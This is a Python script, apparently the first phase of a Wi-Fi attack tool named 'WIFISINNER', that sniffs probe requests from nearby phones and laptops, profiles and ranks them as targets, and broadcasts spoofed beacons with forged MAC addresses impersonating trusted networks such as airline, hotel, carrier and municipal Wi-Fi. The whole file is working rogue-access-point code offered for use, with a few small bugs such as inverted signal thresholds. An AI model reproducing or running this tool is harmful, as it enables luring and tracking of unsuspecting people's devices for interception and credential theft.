#!/usr/bin/env python3
"""
PHASE 1: Autonomous PNL/Beacon Spoofing Engine

Dynamic SSID morphing and MAC spoofing to impersonate trusted networks.
Continuously sweeps RF environment, logs probe requests, and adapts
to target behavior patterns.
"""

import json
import random
import threading
import time
from collections import defaultdict, deque
from datetime import datetime
from pathlib import Path

try:
    from scapy.all import (
        Dot11, Dot11ProbeReq, Dot11ProbeResp, Dot11Beacon,
        Dot11Elt, RadioTap, sendp, sniff
    )
except ImportError:
    print("[!] scapy required: sudo python3 -m pip install --break-system-packages scapy")
    exit(1)

# Trusted network profiles to impersonate (corporate, municipal, consumer)
TRUSTED_PROFILES = {
    "corporate": [
        "Airport_Business", "Starbucks_Guest", "Marriott_Guest", "Hilton_WiFi",
        "Delta_WiFi", "United_Club", "American_Airlines", "Southwest_WiFi",
        "Verizon_WiFi", "AT&T_WiFi", "T-Mobile_5G", "Comcast_Xfinity",
        "Xfinity_WiFi", "ATTWiFi", "Spectrum_Secure"
    ],
    "municipal": [
        "City_Free_WiFi", "Public_Library", "Metro_Transit", "Airport_Public",
        "Municipal_Guest", "Downtown_Free", "City_Hall_Guest", "Park_WiFi",
        "Community_Center", "Government_Hall"
    ],
    "consumer": [
        "Home_Network", "FBI_Surveillance_Van", "Netflix_Update", "Apple_WiFi",
        "Google_Guest", "Amazon_WiFi", "Microsoft_Home", "Samsung_WiFi",
        "LG_SmartTV", "Sony_WiFi", "Bose_Connect", "Ring_Doorbell"
    ],
    "hotel": [
        "Hotel_Guest", "Resort_WiFi", "Conference_Center", "Convention_Hall",
        "Exhibition_WiFi", "Business_Lounge", "VIP_Suite", "Executive_Floor"
    ]
}

# Common router manufacturer OUIs for realistic MAC spoofing
MAC_OUIS = [
    "00:14:22",  # Apple
    "00:1B:63",  # Apple
    "00:23:12",  # Cisco
    "00:25:00",  # Netgear
    "00:26:B9",  # Intel
    "04:9F:CF",  # Google
    "08:00:27",  # Virtual
    "14:D6:4D",  # TP-Link
    "18:33:9D",  # Google
    "1C:BF:CE",  # Xiaomi
    "24:4B:81",  # Samsung
    "2C:AB:75",  # LG
    "3C:A9:F4",  # Intel
    "44:94:FC",  # Google
    "48:4D:7E",  # Dell
    "50:67:F0",  # Amazon
    "54:EE:75",  # Apple
    "58:5C:54",  # TP-Link
    "60:03:08",  # Apple
    "64:16:66",  # Google
    "68:2A:30",  # Samsung
    "70:56:81",  # Apple
    "74:83:C2",  # TP-Link
    "78:AC:C0",  # Samsung
    "7C:D1:C3",  # Xiaomi
    "80:71:1F",  # LG
    "84:1B:5E",  # TP-Link
    "88:E3:AB",  # Apple
    "90:21:55",  # Samsung
    "98:FA:E3",  # Google
    "9C:D2:6B",  # TP-Link
    "A0:02:DC",  # Google
    "A4:83:E7",  # TP-Link
    "A8:66:7F",  # Xiaomi
    "AC:87:A3",  # Netgear
    "B0:4E:26",  # TP-Link
    "B8:27:EB",  # Raspberry Pi
    "BC:A9:D6",  # Xiaomi
    "C0:2F:7C",  # Google
    "C4:71:FE",  # Amazon
    "C8:3A:35",  # TP-Link
    "CC:3A:61",  # Samsung
    "D0:50:99",  # Google
    "D4:96:DF",  # Samsung
    "D8:93:41",  # TP-Link
    "DC:A9:04",  # TP-Link
    "E0:41:36",  # Google
    "E4:5F:01",  # Samsung
    "E8:39:35",  # Google
    "EC:B1:D7",  # TP-Link
    "F0:27:2D",  # Samsung
    "F4:8E:38",  # Samsung
    "F8:1A:67",  # TP-Link
    "FC:A8:41",  # Google
]


class ProbeTracker:
    """Tracks probe requests from nearby devices"""
    
    def __init__(self):
        self.lock = threading.Lock()
        self.probes = defaultdict(lambda: {
            "count": 0,
            "ssids": deque(maxlen=20),
            "last_seen": None,
            "signal": 0
        })
    
    def record(self, mac, ssid, signal):
        with self.lock:
            self.probes[mac]["count"] += 1
            self.probes[mac]["ssids"].append(ssid)
            self.probes[mac]["last_seen"] = datetime.now()
            self.probes[mac]["signal"] = max(self.probes[mac]["signal"], signal)
    
    def get_targets(self, min_probes=3):
        """Return devices actively probing for networks"""
        with self.lock:
            return {
                mac: data for mac, data in self.probes.items()
                if data["count"] >= min_probes and data["last_seen"]
            }
    
    def get_preferred_ssids(self, mac):
        """Get most frequently probed SSIDs for a device"""
        with self.lock:
            if mac not in self.probes:
                return []
            ssids = list(self.probes[mac]["ssids"])
            # Return most recent preferred
            return list(set(ssids[-10:]))


class BeaconSpoof:
    """Dynamic beacon spoofing with adaptive SSID morphing"""
    
    def __init__(self, iface="wlan0", channel=6):
        self.iface = iface
        self.channel = channel
        self.tracker = ProbeTracker()
        self.active = False
        self.current_ssid = "FREE WIFI"
        self.current_mac = self._random_mac()
        self.beacon_interval = 100  # 100 TU (102.4ms)
        self.beacon_thread = None
        self.probe_thread = None
        self.target_mac = None
        self.profile = "corporate"
        self.stats = {
            "beacons_sent": 0,
            "probes_captured": 0,
            "targets_found": 0,
            "morphs": 0,
            "associations": 0
        }
    
    def _random_mac(self):
        """Generate random MAC with realistic OUI"""
        oui = random.choice(MAC_OUIS)
        rest = ":".join(f"{random.randint(0, 255):02x}" for _ in range(3))
        return f"{oui}:{rest}"
    
    def _build_beacon(self, ssid, mac):
        """Build spoofed beacon frame"""
        ssid_bytes = ssid.encode()
        ssid_elt = Dot11Elt(ID="SSID", info=ssid_bytes)
        rates_elt = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
        ds_elt = Dot11Elt(ID="DSset", info=bytes([self.channel]))
        cipher = Dot11Elt(ID="RSN", info=b"\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x02\x00\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x02\x00\x00\x00\x00")
        
        beacon = (
            RadioTap() /
            Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac) /
            Dot11Beacon(cap="ESS") /
            ssid_elt /
            rates_elt /
            ds_elt /
            cipher
        )
        return beacon
    
    def _build_probe_resp(self, ssid, mac):
        """Build spoofed probe response"""
        ssid_bytes = ssid.encode()
        ssid_elt = Dot11Elt(ID="SSID", info=ssid_bytes)
        rates_elt = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
        ds_elt = Dot11Elt(ID="DSset", info=bytes([self.channel]))
        
        resp = (
            RadioTap() /
            Dot11(addr1=mac, addr2=mac, addr3=mac) /
            Dot11ProbeResp(cap="ESS") /
            ssid_elt /
            rates_elt /
            ds_elt
        )
        return resp
    
    def _probe_sniffer(self):
        """Sniff probe requests from target devices"""
        def handler(pkt):
            if pkt.haslayer(Dot11ProbeReq):
                probe = pkt[Dot11ProbeReq]
                mac = probe.addr2
                signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -50
                
                # Extract SSIDs from probe
                ssids = []
                for elt in probe.layers():
                    if elt.name == "Dot11Elt" and elt.ID == 0:
                        try:
                            ssid = elt.info.decode("utf-8", errors="ignore")
                            if ssid and len(ssid) <= 32:
                                ssids.append(ssid)
                        except:
                            pass
                
                # Record all probed SSIDs
                for ssid in ssids:
                    self.tracker.record(mac, ssid, signal)
                
                with self.lock if hasattr(self, 'lock') else threading.Lock():
                    self.stats["probes_captured"] += 1
        
        while self.active:
            try:
                sniff(
                    iface=self.iface,
                    prn=handler,
                    lfilter=lambda p: p.haslayer(Dot11ProbeReq),
                    store=0,
                    timeout=2
                )
            except:
                pass
            if self.active:
                time.sleep(0.1)
    
    def _beacon_spammer(self):
        """Continuously broadcast spoofed beacons"""
        while self.active:
            try:
                # Send beacon
                beacon = self._build_beacon(self.current_ssid, self.current_mac)
                sendp(beacon, iface=self.iface, count=3, inter=0.02, verbose=0)
                self.stats["beacons_sent"] += 3
                
                # Check if we should morph SSID
                if self.target_mac:
                    preferred = self.tracker.get_preferred_ssids(self.target_mac)
                    if preferred and random.random() < 0.3:
                        self._morph_ssid(preferred)
                
                time.sleep(0.1)  # 100 TU beacon interval
            except:
                time.sleep(0.5)
    
    def _morph_ssid(self, preferred):
        """Dynamically change SSID based on target preferences"""
        if not preferred:
            return
        
        # Pick a trusted SSID that matches target's preferences
        all_trusted = []
        for profile in TRUSTED_PROFILES.values():
            all_trusted.extend(profile)
        
        # Find matches
        matches = [s for s in preferred if s in all_trusted]
        if matches:
            new_ssid = random.choice(matches)
        else:
            new_ssid = random.choice(all_trusted)
        
        if new_ssid != self.current_ssid:
            self.current_ssid = new_ssid
            self.current_mac = self._random_mac()  # New MAC for new SSID
            self.stats["morphs"] += 1
    
    def start(self, target_mac=None):
        """Start the spoofing engine"""
        self.active = True
        self.target_mac = target_mac
        
        print(f"[BEACON] Starting spoofing on {self.iface} ch{self.channel}")
        print(f"[BEACON] Initial SSID: {self.current_ssid}")
        print(f"[BEACON] MAC: {self.current_mac}")
        
        # Start probe sniffer
        self.probe_thread = threading.Thread(target=self._probe_sniffer, daemon=True)
        self.probe_thread.start()
        
        # Start beacon spammer
        self.beacon_thread = threading.Thread(target=self._beacon_spammer, daemon=True)
        self.beacon_thread.start()
    
    def stop(self):
        """Stop the spoofing engine"""
        self.active = False
        if self.beacon_thread:
            self.beacon_thread.join(timeout=2)
        if self.probe_thread:
            self.probe_thread.join(timeout=2)
        print(f"[BEACON] Stopped. Beacons: {self.stats['beacons_sent']}, Probes: {self.stats['probes_captured']}")
    
    def get_targets(self):
        """Get currently tracked target devices"""
        targets = self.tracker.get_targets(min_probes=2)
        self.stats["targets_found"] = len(targets)
        return targets
    
    def select_target(self):
        """Select the most promising target device"""
        targets = self.get_targets()
        if not targets:
            return None
        
        # Select target with most probe activity
        return max(targets.keys(), key=lambda m: targets[m]["count"])


class TargetRecon:
    """Reconnaissance module for target profiling"""
    
    def __init__(self):
        self.profiles = {}
        self.lock = threading.Lock()
    
    def analyze(self, mac, probe_data):
        """Analyze target device behavior"""
        with self.lock:
            self.profiles[mac] = {
                "mac": mac,
                "probe_count": probe_data["count"],
                "preferred_ssids": list(probe_data["ssids"]),
                "signal_strength": probe_data["signal"],
                "first_seen": probe_data["last_seen"],
                "device_type": self._classify_device(probe_data),
                "risk_score": self._calculate_risk(probe_data)
            }
    
    def _classify_device(self, probe_data):
        """Classify device type based on probe patterns"""
        ssids = list(probe_data["ssids"])
        
        # Check for iOS indicators
        if any("Home" in s or "AirPort" in s for s in ssids):
            return "iOS"
        
        # Check for Android indicators
        if any("Android" in s or "Direct" in s for s in ssids):
            return "Android"
        
        # Check for Windows
        if any("Windows" in s or "MSHome" in s for s in ssids):
            return "Windows"
        
        # Default classification
        if len(ssids) > 10:
            return "Mobile"
        return "Unknown"
    
    def _calculate_risk(self, probe_data):
        """Calculate target priority score"""
        score = 0
        
        # More probes = higher interest
        score += min(probe_data["count"] * 10, 40)
        
        # Stronger signal = closer proximity
        if probe_data["signal"] < -60:
            score += 30
        elif probe_data["signal"] < -70:
            score += 20
        elif probe_data["signal"] < -80:
            score += 10
        
        # Corporate SSID preference = higher value
        corporate_hits = sum(1 for s in probe_data["ssids"] if s in TRUSTED_PROFILES["corporate"])
        score += corporate_hits * 5
        
        return min(score, 100)
    
    def get_profiles(self):
        """Get all target profiles"""
        with self.lock:
            return self.profiles


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Phase 1: Beacon Spoofing Engine")
    parser.add_argument("--iface", default="wlan0", help="WiFi interface")
    parser.add_argument("--channel", type=int, default=6, help="Channel")
    parser.add_argument("--ssid", default="FREE WIFI", help="Initial SSID")
    parser.add_argument("--duration", type=int, default=60, help="Run duration (seconds)")
    args = parser.parse_args()
    
    spoof = BeaconSpoof(iface=args.iface, channel=args.channel)
    spoof.current_ssid = args.ssid
    
    print(f"\n{'='*60}")
    print(f"WIFISINNER PHASE 1: BEACON SPOOFING ENGINE")
    print(f"{'='*60}\n")
    
    spoof.start()
    
    try:
        start = time.time()
        while time.time() - start < args.duration:
            targets = spoof.get_targets()
            if targets:
                print(f"\n[!] Found {len(targets)} target(s):")
                for mac, data in targets.items():
                    print(f"    {mac}: {data['count']} probes, signal {data['signal']}dBm")
                    print(f"       Preferred: {list(data['ssids'])[:5]}")
            time.sleep(2)
    except KeyboardInterrupt:
        pass
    finally:
        spoof.stop()
